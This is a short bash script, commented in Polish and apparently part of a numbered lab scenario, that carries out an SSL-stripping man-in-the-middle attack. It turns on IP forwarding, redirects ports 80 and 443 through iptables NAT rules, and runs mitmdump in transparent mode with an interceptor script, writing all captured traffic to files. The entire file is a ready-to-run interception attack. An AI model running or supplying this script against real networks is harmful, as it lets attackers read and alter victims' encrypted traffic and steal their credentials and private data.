#!/bin/bash

echo "============================================"
echo "  SCENARIUSZ 2: ATAK SSL STRIPPING"
echo "============================================"
echo ""
echo "UWAGA: Rozpoczynanie ataku SSL Stripping"
echo ""

echo "1. Wlaczanie przekazywania IP..."
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "   [OK] Przekazywanie IP juz wlaczone"

echo "2. Konfiguracja iptables..."
iptables -t nat -F PREROUTING
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

echo "3. Reguly iptables:"
iptables -t nat -L PREROUTING -n -v | grep REDIRECT

echo ""
echo "4. Uruchamianie mitmproxy..."
echo "   Port: 8080"
echo "   Plik: /proxy/output/capture.mitm"
echo "   Logi: /proxy/output/ssl_strip.log"
echo ""
echo "CALY RUCH HTTPS JEST TERAZ WIDOCZNY"
echo ""
echo "Nacisnij Ctrl+C aby zatrzymac"
echo ""

mitmdump -m transparent --listen-port 8080 \
  -s /proxy/ssl_interceptor.py \
  --set ssl_insecure=true \
  -w /proxy/output/capture.mitm 2>&1 | tee /proxy/output/ssl_strip.log
